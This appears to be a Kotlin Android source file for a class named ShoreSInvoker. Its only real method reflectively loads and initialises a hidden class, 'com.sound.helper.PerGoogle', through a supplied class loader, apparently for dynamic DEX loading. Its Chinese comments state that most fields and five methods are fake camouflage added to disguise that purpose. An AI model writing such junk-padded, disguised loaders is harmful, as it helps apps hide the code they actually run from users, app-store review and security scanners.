package com.river.shore

import android.content.Context
import java.util.Random

class ShoreSInvoker {
    // 新类的10个变量（其中部分用于伪装）
    private var unusedString: String = "Initial"
    private var fakeFlag: Boolean = false
    private var counter: Int = 0
    private val random = Random()
    private val tag: String = "DexInvoker"
    private var buffer: ByteArray? = null
    private var dummyList: MutableList<String> = mutableListOf()
    private var temporaryContext: Context? = null
    var checksum: Long = 0L
    private var lastOperationTime: Long = 0L

    // 方法3: 加载类并调用（核心方法，6个方法之一）
    fun loadAndInvokeClass(classLoader: Any, context: Context) {
        if (checksum > 10) {
            logDummyOperation("qqiisog")
            if (checksum == 12L) {
                validateChecksum(null)
            } else {
                validateChecksum(byteArrayOf(11, 1))

            }

        }
        val loadedClass = classLoader.javaClass.getMethod("loadClass", String::class.java)
            .invoke(classLoader, "com.sound.helper.PerGoogle") as Class<*>
        loadedClass.getMethod("init", Context::class.java, String::class.java)
            .invoke(null, context, "num")
    }

    // 以下是另外5个伪装方法（示例）
    private fun validateChecksum(data: ByteArray?): Boolean {
        // 一个假的校验计算
        logDummyOperation("sss")
        return data?.size?.hashCode()?.and(0xFF) == random.nextInt(256)
    }

    fun logDummyOperation(phase: String) {
        // 一个假的日志方法
        lastOperationTime = System.currentTimeMillis()
        manipulateBuffer()
        clearTemporaryState()
    }

    private fun manipulateBuffer() {
        // 一个假的数据处理
        buffer?.let { fakeFlag = it.size > 10 }
        clearTemporaryState()
    }

    private fun updateCounter() {
        // 更新计数器
        counter += random.nextInt(3)
        clearTemporaryState()
    }

    private fun clearTemporaryState() {
        // 清理状态
        dummyList.clear()
        temporaryContext = null
    }
}